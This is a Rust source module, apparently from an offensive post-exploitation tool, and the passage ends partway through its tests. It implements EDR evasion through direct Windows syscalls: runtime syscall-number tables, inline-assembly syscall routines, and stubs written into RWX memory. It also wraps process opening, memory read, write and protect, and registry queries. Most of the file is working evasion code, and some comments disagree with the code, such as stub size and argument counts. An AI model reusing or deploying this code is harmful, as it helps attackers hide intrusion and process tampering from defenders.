#![allow(clippy::missing_safety_doc)]
//! Raw Syscall Infrastructure — EDR bypass via direct `syscall` instruction.
//!
//! This module provides the lowest-level primitive for EDR evasion: executing
//! NT syscalls via the `syscall` instruction directly, bypassing any userland
//! hooks placed on ntdll.dll exports by EDR products.
//!
//! # Architecture
//!
//! 1. **Syscall Numbers** are resolved at runtime from ntdll's export table
//!    (see `opsec::resolve_syscall_numbers` / `edr_bypass::resolve_clean_syscall_numbers`).
//! 2. **Raw execution (1–4 args)** uses `core::arch::asm!` to emit
//!    `mov r10, rcx; mov eax, SSN; syscall; ret`.
//! 3. **5+ args** uses a runtime stub generator: the stub bytes are written into
//!    executable memory (allocated via kernel32!VirtualAlloc, which is not usually
//!    hooked by EDRs), then called as a function pointer.
//! 4. **Wrappers** provide Rust functions for common Nt* syscalls using the
//!    resolved syscall numbers.
//!
//! # Safety
//!
//! All functions in this module are `unsafe`. The caller must ensure:
//! - The syscall number matches the *current* Windows build
//! - All pointer arguments are valid, aligned, and properly sized
//! - The calling process has sufficient privilege for the requested operation
//!
//! # Windows x64 Syscall Convention
//!
//! | Register | Role |
//! |----------|------|
//! | RCX → R10 | First argument (saved to R10, since SYSCALL clobbers RCX→RIP) |
//! | RDX | Second argument |
//! | R8  | Third argument |
//! | R9  | Fourth argument |
//! | Stack | Fifth+ arguments (RSP+0, RSP+8, …) |
//! | EAX | Syscall number |
//! | RAX | Return value (0 = success, negative = NTSTATUS error) |
//! | RCX | Clobbered (becomes RIP after syscall) |
//! | R11 | Clobbered (becomes RFLAGS after syscall) |

use crate::error::{OverthroneError, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

// ─── SyscallNumbers: resolved syscall numbers ──────────────────────

/// Resolved syscall numbers for commonly used NT API functions.
///
/// Populated at runtime by parsing ntdll's export table. The exact numbers
/// vary by Windows build (e.g., Win10 22H2 vs Win11 24H2), so runtime
/// resolution is essential.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SyscallNumbers {
    pub nt_allocate_virtual_memory: u32,
    pub nt_protect_virtual_memory: u32,
    pub nt_write_virtual_memory: u32,
    pub nt_open_process: u32,
    pub nt_close: u32,
    pub nt_create_thread_ex: u32,
    pub nt_query_system_information: u32,
    pub nt_query_information_process: u32,
    pub nt_open_key: u32,
    pub nt_query_value_key: u32,
    pub nt_read_virtual_memory: u32,
    pub nt_free_virtual_memory: u32,
    pub nt_duplicate_object: u32,
    pub nt_open_process_token: u32,
    pub nt_query_information_token: u32,
    pub nt_set_information_thread: u32,
    pub nt_queue_apc_thread: u32,
    pub nt_resume_thread: u32,
    pub nt_get_context_thread: u32,
    pub nt_set_context_thread: u32,
    pub nt_delay_execution: u32,
    pub nt_flush_instruction_cache: u32,
    pub nt_adjust_privileges_token: u32,
    pub nt_query_virtual_memory: u32,
}

impl Default for SyscallNumbers {
    fn default() -> Self {
        // Pre-populate with common syscall numbers for Windows 10 22H2 / 11 23H2
        // These serve as fallbacks if runtime resolution fails.
        Self {
            nt_allocate_virtual_memory: 0x18,
            nt_protect_virtual_memory: 0x50,
            nt_write_virtual_memory: 0x3A,
            nt_open_process: 0x26,
            nt_close: 0x0F,
            nt_create_thread_ex: 0xB5,
            nt_query_system_information: 0x36,
            nt_query_information_process: 0x19,
            nt_open_key: 0x1A,
            nt_query_value_key: 0x1D,
            nt_read_virtual_memory: 0x3C,
            nt_free_virtual_memory: 0x1E,
            nt_duplicate_object: 0x2F,
            nt_open_process_token: 0x2A,
            nt_query_information_token: 0x2B,
            nt_set_information_thread: 0x0D,
            nt_queue_apc_thread: 0x43,
            nt_resume_thread: 0x52,
            nt_get_context_thread: 0x47,
            nt_set_context_thread: 0x48,
            nt_delay_execution: 0x34,
            nt_flush_instruction_cache: 0x54,
            nt_adjust_privileges_token: 0x4C,
            nt_query_virtual_memory: 0x23,
        }
    }
}

impl SyscallNumbers {
    /// Resolve all tracked syscall numbers from the *loaded* ntdll export table.
    ///
    /// Uses `opsec::resolve_syscall_numbers()`. If ntdll has been unhooked, these
    /// numbers are reliable. Falls back to defaults on failure.
    #[cfg(target_os = "windows")]
    pub fn resolve() -> Self {
        match crate::postex::opsec::resolve_syscall_numbers() {
            Ok(map) => Self::from_map(&map),
            Err(_) => {
                tracing::warn!("syscall number resolution failed, using fallback defaults");
                Self::default()
            }
        }
    }

    /// Resolve from a *clean* disk-mapped ntdll copy (post-unhook).
    #[cfg(target_os = "windows")]
    pub fn resolve_clean() -> Self {
        match crate::postex::edr_bypass::resolve_clean_syscall_numbers() {
            Ok(map) => Self::from_map(&map),
            Err(_) => {
                tracing::warn!("clean syscall resolution failed, using fallback defaults");
                Self::default()
            }
        }
    }

    /// Populate from a name→number map.
    pub fn from_map(map: &HashMap<String, u32>) -> Self {
        Self {
            nt_allocate_virtual_memory: map.get("NtAllocateVirtualMemory").copied().unwrap_or(0x18),
            nt_protect_virtual_memory: map.get("NtProtectVirtualMemory").copied().unwrap_or(0x50),
            nt_write_virtual_memory: map.get("NtWriteVirtualMemory").copied().unwrap_or(0x3A),
            nt_open_process: map.get("NtOpenProcess").copied().unwrap_or(0x26),
            nt_close: map.get("NtClose").copied().unwrap_or(0x0F),
            nt_create_thread_ex: map.get("NtCreateThreadEx").copied().unwrap_or(0xB5),
            nt_query_system_information: map
                .get("NtQuerySystemInformation")
                .copied()
                .unwrap_or(0x36),
            nt_query_information_process: map
                .get("NtQueryInformationProcess")
                .copied()
                .unwrap_or(0x19),
            nt_open_key: map.get("NtOpenKey").copied().unwrap_or(0x1A),
            nt_query_value_key: map.get("NtQueryValueKey").copied().unwrap_or(0x1D),
            nt_read_virtual_memory: map.get("NtReadVirtualMemory").copied().unwrap_or(0x3C),
            nt_free_virtual_memory: map.get("NtFreeVirtualMemory").copied().unwrap_or(0x1E),
            nt_duplicate_object: map.get("NtDuplicateObject").copied().unwrap_or(0x2F),
            nt_open_process_token: map.get("NtOpenProcessToken").copied().unwrap_or(0x2A),
            nt_query_information_token: map.get("NtQueryInformationToken").copied().unwrap_or(0x2B),
            nt_set_information_thread: map.get("NtSetInformationThread").copied().unwrap_or(0x0D),
            nt_queue_apc_thread: map.get("NtQueueApcThread").copied().unwrap_or(0x43),
            nt_resume_thread: map.get("NtResumeThread").copied().unwrap_or(0x52),
            nt_get_context_thread: map.get("NtGetContextThread").copied().unwrap_or(0x47),
            nt_set_context_thread: map.get("NtSetContextThread").copied().unwrap_or(0x48),
            nt_delay_execution: map.get("NtDelayExecution").copied().unwrap_or(0x34),
            nt_flush_instruction_cache: map.get("NtFlushInstructionCache").copied().unwrap_or(0x54),
            nt_adjust_privileges_token: map.get("NtAdjustPrivilegesToken").copied().unwrap_or(0x4C),
            nt_query_virtual_memory: map.get("NtQueryVirtualMemory").copied().unwrap_or(0x23),
        }
    }

    /// Number of tracked syscalls.
    pub const fn tracked_count() -> usize {
        24
    }
}

// ─── SyscallStatus ─────────────────────────────────────────────────

/// The status returned by a raw syscall (NTSTATUS).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SyscallStatus(pub i64);

impl SyscallStatus {
    pub fn is_success(&self) -> bool {
        self.0 >= 0
    }

    pub fn is_error(&self) -> bool {
        self.0 < 0
    }

    pub fn ntstatus(&self) -> i64 {
        self.0
    }

    pub fn to_result(self, operation: &str) -> Result<()> {
        if self.is_success() {
            Ok(())
        } else {
            let code = self.0 as u32;
            let msg = ntstatus_to_message(code);
            Err(OverthroneError::PostExploitation(format!(
                "{} failed: NTSTATUS=0x{code:08X} ({msg})",
                operation
            )))
        }
    }
}

// ─── Inline asm raw syscalls (1–4 args) ───────────────────────────────

/// Execute a raw syscall with 0 arguments.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline]
pub unsafe fn syscall_0(syscall_number: u32) -> SyscallStatus {
    let result: i64;
    unsafe {
        core::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("eax") syscall_number,
            in("rcx") 0usize,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack)
        );
    }
    SyscallStatus(result)
}

/// Execute a raw syscall with 1 argument.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline]
pub unsafe fn syscall_1(syscall_number: u32, arg1: *const std::ffi::c_void) -> SyscallStatus {
    let result: i64;
    unsafe {
        core::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("eax") syscall_number,
            in("rcx") arg1,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack)
        );
    }
    SyscallStatus(result)
}

/// Execute a raw syscall with 2 arguments.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline]
pub unsafe fn syscall_2(
    syscall_number: u32,
    arg1: *const std::ffi::c_void,
    arg2: *const std::ffi::c_void,
) -> SyscallStatus {
    let result: i64;
    unsafe {
        core::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("eax") syscall_number,
            in("rcx") arg1,
            in("rdx") arg2,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack)
        );
    }
    SyscallStatus(result)
}

/// Execute a raw syscall with 3 arguments.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline]
pub unsafe fn syscall_3(
    syscall_number: u32,
    arg1: *const std::ffi::c_void,
    arg2: *const std::ffi::c_void,
    arg3: *const std::ffi::c_void,
) -> SyscallStatus {
    let result: i64;
    unsafe {
        core::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("eax") syscall_number,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack)
        );
    }
    SyscallStatus(result)
}

/// Execute a raw syscall with 4 arguments.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[inline]
pub unsafe fn syscall_4(
    syscall_number: u32,
    arg1: *const std::ffi::c_void,
    arg2: *const std::ffi::c_void,
    arg3: *const std::ffi::c_void,
    arg4: *const std::ffi::c_void,
) -> SyscallStatus {
    let result: i64;
    unsafe {
        core::arch::asm!(
            "mov r10, rcx",
            "syscall",
            in("eax") syscall_number,
            in("rcx") arg1,
            in("rdx") arg2,
            in("r8") arg3,
            in("r9") arg4,
            lateout("rax") result,
            out("r10") _,
            out("r11") _,
            options(nostack)
        );
    }
    SyscallStatus(result)
}

// ─── Non-Windows stubs ─────────────────────────────────────────────

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn syscall_1(_syscall_number: u32, _arg1: *const std::ffi::c_void) -> SyscallStatus {
    SyscallStatus(-1)
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn syscall_2(
    _syscall_number: u32,
    _arg1: *const std::ffi::c_void,
    _arg2: *const std::ffi::c_void,
) -> SyscallStatus {
    SyscallStatus(-1)
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn syscall_3(
    _syscall_number: u32,
    _arg1: *const std::ffi::c_void,
    _arg2: *const std::ffi::c_void,
    _arg3: *const std::ffi::c_void,
) -> SyscallStatus {
    SyscallStatus(-1)
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn syscall_4(
    _syscall_number: u32,
    _arg1: *const std::ffi::c_void,
    _arg2: *const std::ffi::c_void,
    _arg3: *const std::ffi::c_void,
    _arg4: *const std::ffi::c_void,
) -> SyscallStatus {
    SyscallStatus(-1)
}

// ─── Runtime syscall stub generator (for 5+ args) ──────────────────

/// A dynamically generated syscall stub stored in executable memory.
///
/// The stub is a small function (12 bytes on x64) that performs:
/// ```asm
/// mov r10, rcx      ; save first arg (syscall clobbers rcx)
/// mov eax, SSN      ; load syscall number
/// syscall           ; execute
/// ret               ; return (result in rax)
/// ```
///
/// Since stub functions use the standard Windows x64 calling convention,
/// they support any number of arguments (the caller passes them in
/// registers and stack as usual).
#[allow(dead_code)]
pub struct DynamicSyscallStub {
    exec_ptr: *mut std::ffi::c_void,
    alloc_size: usize,
}

impl DynamicSyscallStub {
    /// Build a new executable stub for the given syscall number.
    ///
    /// Allocates RWX memory via `kernel32!VirtualAlloc` (not a direct syscall,
    /// but kernel32 is rarely hooked by EDRs). The stub is 12 bytes.
    ///
    /// Returns `None` if the executable allocation fails (e.g., on non-Windows).
    #[cfg(target_os = "windows")]
    pub fn new(syscall_number: u32) -> Option<Self> {
        unsafe {
            // Stub bytes: mov r10, rcx; mov eax, SSN; syscall; ret
            let stub: [u8; 11] = [
                0x4C,
                0x8B,
                0xD1, // mov r10, rcx
                0xB8, // mov eax, ...
                (syscall_number & 0xFF) as u8,
                ((syscall_number >> 8) & 0xFF) as u8,
                ((syscall_number >> 16) & 0xFF) as u8,
                ((syscall_number >> 24) & 0xFF) as u8,
                0x0F,
                0x05, // syscall
                0xC3, // ret
            ];

            let alloc_size = stub.len();
            let exec_ptr = Self::allocate_executable(alloc_size)?;

            // Copy stub into executable memory
            std::ptr::copy_nonoverlapping(stub.as_ptr(), exec_ptr as *mut u8, alloc_size);

            Some(Self {
                exec_ptr,
                alloc_size,
            })
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn new(_syscall_number: u32) -> Option<Self> {
        None
    }

    /// Allocate RWX memory for the stub.
    #[cfg(target_os = "windows")]
    unsafe fn allocate_executable(size: usize) -> Option<*mut std::ffi::c_void> {
        use windows::Win32::System::Memory::{
            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAlloc,
        };

        let ptr =
            unsafe { VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) };

        if ptr.is_null() { None } else { Some(ptr) }
    }

    /// Call the stub with the given arguments.
    ///
    /// # Safety
    /// The caller must ensure the stub is valid and the arguments match the
    /// expected syscall signature.
    pub unsafe fn call(&self) -> SyscallStatus {
        type SyscallFn0 = unsafe extern "system" fn() -> i64;
        unsafe {
            let f: SyscallFn0 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f())
        }
    }

    pub unsafe fn call1(&self, arg1: *const std::ffi::c_void) -> SyscallStatus {
        type SyscallFn1 = unsafe extern "system" fn(*const std::ffi::c_void) -> i64;
        unsafe {
            let f: SyscallFn1 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f(arg1))
        }
    }

    pub unsafe fn call3(
        &self,
        arg1: *const std::ffi::c_void,
        arg2: *const std::ffi::c_void,
        arg3: *const std::ffi::c_void,
    ) -> SyscallStatus {
        type SyscallFn3 = unsafe extern "system" fn(
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
        ) -> i64;
        unsafe {
            let f: SyscallFn3 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f(arg1, arg2, arg3))
        }
    }

    pub unsafe fn call2(
        &self,
        arg1: *const std::ffi::c_void,
        arg2: *const std::ffi::c_void,
    ) -> SyscallStatus {
        type SyscallFn2 =
            unsafe extern "system" fn(*const std::ffi::c_void, *const std::ffi::c_void) -> i64;
        unsafe {
            let f: SyscallFn2 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f(arg1, arg2))
        }
    }

    pub unsafe fn call4(
        &self,
        arg1: *const std::ffi::c_void,
        arg2: *const std::ffi::c_void,
        arg3: *const std::ffi::c_void,
        arg4: *const std::ffi::c_void,
    ) -> SyscallStatus {
        type SyscallFn4 = unsafe extern "system" fn(
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
        ) -> i64;
        unsafe {
            let f: SyscallFn4 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f(arg1, arg2, arg3, arg4))
        }
    }

    pub unsafe fn call6(
        &self,
        arg1: *const std::ffi::c_void,
        arg2: *const std::ffi::c_void,
        arg3: *const std::ffi::c_void,
        arg4: *const std::ffi::c_void,
        arg5: *const std::ffi::c_void,
        arg6: *const std::ffi::c_void,
    ) -> SyscallStatus {
        type SyscallFn6 = unsafe extern "system" fn(
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
            *const std::ffi::c_void,
        ) -> i64;
        unsafe {
            let f: SyscallFn6 = std::mem::transmute(self.exec_ptr);
            SyscallStatus(f(arg1, arg2, arg3, arg4, arg5, arg6))
        }
    }

    /// The executable function pointer.
    pub fn as_ptr(&self) -> *const std::ffi::c_void {
        self.exec_ptr
    }
}

impl Drop for DynamicSyscallStub {
    fn drop(&mut self) {
        #[cfg(target_os = "windows")]
        unsafe {
            use windows::Win32::System::Memory::{MEM_RELEASE, VirtualFree};
            if !self.exec_ptr.is_null() {
                let _ = VirtualFree(self.exec_ptr, 0, MEM_RELEASE);
            }
        }
    }
}

// ─── Nt* wrapper functions ─────────────────────────────────────────

/// Wrapper: NtClose — close a handle.
#[cfg(target_os = "windows")]
pub unsafe fn nt_close(syscall_num: u32, handle: isize) -> SyscallStatus {
    unsafe { syscall_1(syscall_num, handle as *const std::ffi::c_void) }
}

/// Wrapper: NtProtectVirtualMemory — change page protection.
/// (5 args: Handle, BaseAddress, RegionSize, NewProtect, OldProtect)
#[cfg(target_os = "windows")]
pub unsafe fn nt_protect_virtual_memory(
    syscall_num: u32,
    handle: isize,
    base_address: *mut *mut std::ffi::c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> SyscallStatus {
    // Use a dynamic stub for 5+ args
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call6(
            handle as *const std::ffi::c_void,
            base_address as *const std::ffi::c_void,
            region_size as *const std::ffi::c_void,
            new_protect as usize as *const std::ffi::c_void,
            old_protect as *const std::ffi::c_void,
            std::ptr::null(),
        )
    }
}

/// Wrapper: NtAllocateVirtualMemory.
/// (6 args: Handle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect)
#[cfg(target_os = "windows")]
pub unsafe fn nt_allocate_virtual_memory(
    syscall_num: u32,
    handle: isize,
    base_address: *mut *mut std::ffi::c_void,
    zero_bits: u64,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call6(
            handle as *const std::ffi::c_void,
            base_address as *const std::ffi::c_void,
            zero_bits as usize as *const std::ffi::c_void,
            region_size as *const std::ffi::c_void,
            allocation_type as usize as *const std::ffi::c_void,
            protect as usize as *const std::ffi::c_void,
        )
    }
}

/// Wrapper: NtWriteVirtualMemory.
/// (5 args: Handle, BaseAddress, Buffer, BufferSize, BytesWritten)
#[cfg(target_os = "windows")]
pub unsafe fn nt_write_virtual_memory(
    syscall_num: u32,
    handle: isize,
    base_address: *const std::ffi::c_void,
    buffer: *const std::ffi::c_void,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call6(
            handle as *const std::ffi::c_void,
            base_address,
            buffer,
            buffer_size as *const std::ffi::c_void,
            bytes_written as *const std::ffi::c_void,
            std::ptr::null(),
        )
    }
}

/// Wrapper: NtOpenProcess.
/// (5 args: ProcessHandle, DesiredAccess, ObjectAttributes, ClientId)
#[cfg(target_os = "windows")]
pub unsafe fn nt_open_process(
    syscall_num: u32,
    process_handle: *mut isize,
    desired_access: u32,
    object_attributes: *const std::ffi::c_void,
    client_id: *const std::ffi::c_void,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call4(
            process_handle as *const std::ffi::c_void,
            desired_access as usize as *const std::ffi::c_void,
            object_attributes,
            client_id,
        )
    }
}

/// Wrapper: NtReadVirtualMemory.
/// (5 args: ProcessHandle, BaseAddress, Buffer, BufferSize, BytesRead)
#[cfg(target_os = "windows")]
pub unsafe fn nt_read_virtual_memory(
    syscall_num: u32,
    handle: isize,
    base_address: *const std::ffi::c_void,
    buffer: *mut std::ffi::c_void,
    buffer_size: usize,
    bytes_read: *mut usize,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call6(
            handle as *const std::ffi::c_void,
            base_address,
            buffer as *const std::ffi::c_void,
            buffer_size as *const std::ffi::c_void,
            bytes_read as *const std::ffi::c_void,
            std::ptr::null(),
        )
    }
}

/// Wrapper: NtOpenKey — open a registry key.
#[cfg(target_os = "windows")]
pub unsafe fn nt_open_key(
    syscall_num: u32,
    key_handle: *mut isize,
    desired_access: u32,
    object_attributes: *const std::ffi::c_void,
) -> SyscallStatus {
    unsafe {
        syscall_4(
            syscall_num,
            key_handle as *const std::ffi::c_void,
            desired_access as usize as *const std::ffi::c_void,
            object_attributes,
            std::ptr::null(),
        )
    }
}

/// Wrapper: NtQueryValueKey — query a registry value.
#[cfg(target_os = "windows")]
pub unsafe fn nt_query_value_key(
    syscall_num: u32,
    key_handle: isize,
    value_name: *const u16,
    key_value_information_class: u32,
    key_value_information: *mut std::ffi::c_void,
    key_value_information_length: u32,
    result_length: *mut u32,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call6(
            key_handle as *const std::ffi::c_void,
            value_name as *const std::ffi::c_void,
            key_value_information_class as usize as *const std::ffi::c_void,
            key_value_information,
            key_value_information_length as usize as *const std::ffi::c_void,
            result_length as *const std::ffi::c_void,
        )
    }
}

/// Wrapper: NtQuerySystemInformation.
#[cfg(target_os = "windows")]
pub unsafe fn nt_query_system_information(
    syscall_num: u32,
    system_information_class: u32,
    system_information: *mut std::ffi::c_void,
    system_information_length: u32,
    return_length: *mut u32,
) -> SyscallStatus {
    let Some(stub) = DynamicSyscallStub::new(syscall_num) else {
        return SyscallStatus(-1);
    };
    unsafe {
        stub.call4(
            system_information_class as usize as *const std::ffi::c_void,
            system_information as *const std::ffi::c_void,
            system_information_length as usize as *const std::ffi::c_void,
            return_length as *const std::ffi::c_void,
        )
    }
}

/// Wrapper: NtDelayExecution — sleep a thread.
#[cfg(target_os = "windows")]
pub unsafe fn nt_delay_execution(
    syscall_num: u32,
    alertable: bool,
    delay_interval: *mut i64,
) -> SyscallStatus {
    unsafe {
        syscall_2(
            syscall_num,
            alertable as usize as *const std::ffi::c_void,
            delay_interval as *const std::ffi::c_void,
        )
    }
}

// ─── Safe-ish convenience wrappers (resolve + execute) ─────────────

/// Resolve syscall numbers and allocate a dynamic stub for the given syscall name.
/// Returns `(syscall_number, DynamicSyscallStub)`.
#[cfg(target_os = "windows")]
pub fn prepare_syscall_stub(name: &str) -> Option<(u32, DynamicSyscallStub)> {
    let numbers = SyscallNumbers::resolve();
    let ssn = match name {
        "NtProtectVirtualMemory" => numbers.nt_protect_virtual_memory,
        "NtAllocateVirtualMemory" => numbers.nt_allocate_virtual_memory,
        "NtWriteVirtualMemory" => numbers.nt_write_virtual_memory,
        "NtOpenProcess" => numbers.nt_open_process,
        "NtClose" => numbers.nt_close,
        "NtCreateThreadEx" => numbers.nt_create_thread_ex,
        "NtQuerySystemInformation" => numbers.nt_query_system_information,
        "NtQueryInformationProcess" => numbers.nt_query_information_process,
        "NtOpenKey" => numbers.nt_open_key,
        "NtQueryValueKey" => numbers.nt_query_value_key,
        "NtReadVirtualMemory" => numbers.nt_read_virtual_memory,
        "NtFreeVirtualMemory" => numbers.nt_free_virtual_memory,
        "NtDelayExecution" => numbers.nt_delay_execution,
        "NtAdjustPrivilegesToken" => numbers.nt_adjust_privileges_token,
        "NtQueryVirtualMemory" => numbers.nt_query_virtual_memory,
        "NtOpenProcessToken" => numbers.nt_open_process_token,
        _ => return None,
    };
    let stub = DynamicSyscallStub::new(ssn)?;
    Some((ssn, stub))
}

#[cfg(not(target_os = "windows"))]
pub fn prepare_syscall_stub(_name: &str) -> Option<(u32, DynamicSyscallStub)> {
    None
}

// ─── NTSTATUS message table ────────────────────────────────────────

fn ntstatus_to_message(code: u32) -> &'static str {
    match code {
        0x00000000 => "STATUS_SUCCESS",
        0xC0000001 => "STATUS_UNSUCCESSFUL",
        0xC0000002 => "STATUS_NOT_IMPLEMENTED",
        0xC0000005 => "STATUS_ACCESS_VIOLATION",
        0xC0000008 => "STATUS_INVALID_HANDLE",
        0xC000000D => "STATUS_INVALID_PARAMETER",
        0xC0000010 | 0xC0000017 => "STATUS_NO_MEMORY",
        0xC0000022 => "STATUS_ACCESS_DENIED",
        0xC0000023 => "STATUS_BUFFER_TOO_SMALL",
        0xC0000034 => "STATUS_OBJECT_NAME_NOT_FOUND",
        0xC0000035 => "STATUS_OBJECT_NAME_COLLISION",
        0xC000003A => "STATUS_OBJECT_PATH_NOT_FOUND",
        0xC0000040 => "STATUS_ALREADY_COMMITTED",
        0xC0000041 => "STATUS_ALREADY_EXISTS",
        0xC0000055 => "STATUS_PROCESS_IS_TERMINATING",
        0xC000006A => "STATUS_WRONG_PASSWORD",
        0xC000006D => "STATUS_LOGON_FAILURE",
        0xC0000072 => "STATUS_ACCOUNT_DISABLED",
        0xC000008B => "STATUS_NOT_SUPPORTED",
        0xC0000095 => "STATUS_PENDING",
        0xC00000BB => "STATUS_NOT_SUPPORTED",
        0xC00000D5 => "STATUS_ALREADY_DISCONNECTED",
        0xC0000135 => "STATUS_DLL_NOT_FOUND",
        0xC0000138 => "STATUS_ORDINAL_NOT_FOUND",
        0xC0000139 => "STATUS_ENTRYPOINT_NOT_FOUND",
        0xC0000142 => "STATUS_DLL_INIT_FAILED",
        0xC0000225 => "STATUS_NOT_FOUND",
        0xC0000353 => "STATUS_NO_MORE_ENTRIES",
        0xC0000372 => "STATUS_HEAP_CORRUPTION",
        0xC000041D => "STATUS_STACK_BUFFER_OVERRUN",
        0xC0000428 => "STATUS_ASSERTION_FAILURE",
        _ => "STATUS_UNKNOWN",
    }
}

// ─── Tests ─────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_syscall_numbers_default() {
        let nums = SyscallNumbers::default();
        assert_eq!(nums.nt_open_process, 0x26);
        assert_eq!(nums.nt_close, 0x0F);
        assert_eq!(nums.nt_protect_virtual_memory, 0x50);
        assert_eq!(SyscallNumbers::tracked_count(), 24);
    }

    #[test]
    fn test_syscall_numbers_from_map() {
        let mut map = HashMap::new();
        map.insert("NtOpenProcess".to_string(), 0x42);
        map.insert("NtAllocateVirtualMemory".to_string(), 0x18);
        map.insert("NtClose".to_string(), 0x0F);

        let nums = SyscallNumbers::from_map(&map);
        assert_eq!(nums.nt_open_process, 0x42);
        assert_eq!(nums.nt_allocate_virtual_memory, 0x18);
        assert_eq!(nums.nt_close, 0x0F);
        assert_eq!(nums.nt_write_virtual_memory, 0x3A);
    }

    #[test]
    fn test_syscall_numbers_round_trip_serialize() {
        let nums = SyscallNumbers::default();
        let json = serde_json::to_string(&nums).unwrap();
        let deserialized: SyscallNumbers = serde_json::from_str(&json).unwrap();
        assert_eq!(deserialized.nt_open_process, nums.nt_open_process);
        assert_eq!(deserialized.nt_close, nums.nt_close);
    }

    #[test]
    fn test_syscall_status_success() {
        let s = SyscallStatus(0);
        assert!(s.is_success());
        assert!(!s.is_error());
        assert_eq!(s.ntstatus(), 0);
        assert!(s.to_result("test_op").is_ok());
    }

    #[test]
    fn test_syscall_status_error() {
        let s: SyscallStatus = SyscallStatus(-1);
        assert!(!s.is_success());
        assert!(s.is_error());
        assert!(s.to_result("test_op").is_err());
    }

    #[test]
    fn test_syscall_status_c0000022() {
        // NTSTATUS 0xC0000022 as signed i64 (STATUS_ACCESS_DENIED)
        let s = SyscallStatus(-1073741790i64);
        assert!(s.is_error());
        let err = s.to_result("NtOpenProcess").unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("NtOpenProcess"));
        assert!(msg.contains("0xC0000022"));
        assert!(msg.contains("STATUS_ACCESS_DENIED"));
    }

    #[test]
    fn test_ntstatus_to_message() {
        assert_eq!(ntstatus_to_message(0x00000000), "STATUS_SUCCESS");
        assert_eq!(ntstatus_to_message(0xC0000005), "STATUS_ACCESS_VIOLATION");
        assert_eq!(ntstatus_to_message(0xC0000022), "STATUS_ACCESS_DENIED");
        assert_eq!(ntstatus_to_message(0xC000006D), "STATUS_LOGON_FAILURE");
        assert_eq!(ntstatus_to_message(0xC0000135), "STATUS_DLL_NOT_FOUND");
        assert_eq!(ntstatus_to_message(0xDEADBEEF), "STATUS_UNKNOWN");
    }

    #[test]
    fn test_tracked_count_matches_fields() {
        let nums = SyscallNumbers::default();
        let field_count = 24;
        assert_eq!(SyscallNumbers::tracked_count(), field_count);
        // Verify none are zero for critical syscalls
        assert_ne!(nums.nt_open_process, 0);
        assert_ne!(nums.nt_allocate_virtual_memory, 0);
        assert_ne!(nums.nt_protect_virtual_memory, 0);
        assert_ne!(nums.nt_close, 0);
    }

    #[test]
    fn test_syscall_numbers_resolve_graceful_fallback() {
        #[cfg(not(target_os = "windows"))]
        {
            let nums = SyscallNumbers::resolve();
            assert_eq!(nums.nt_open_process, 0x26);
        }
        #[cfg(target_os = "windows")]
        {
            let nums = SyscallNumbers::resolve();
            assert_eq!(nums.nt_close, 0x0F);
        }
    }

    #[test]
    fn test_dynamic_syscall_stub_non_windows() {
        #[cfg(not(target_os = "windows"))]
        {
            let stub = DynamicSyscallStub::new(0x26);
            assert!(stub.is_none());
        }
    }

    #[test]
    fn test_prepare_syscall_stub_known_names() {
        #[cfg(not(target_os = "windows"))]
        {
            assert!(prepare_syscall_stub("NtClose").is_none());
            assert!(prepare_syscall_stub("NtProtectVirtualMemory").is_none());
            assert!(prepare_syscall_stub("FakeName").is_none());
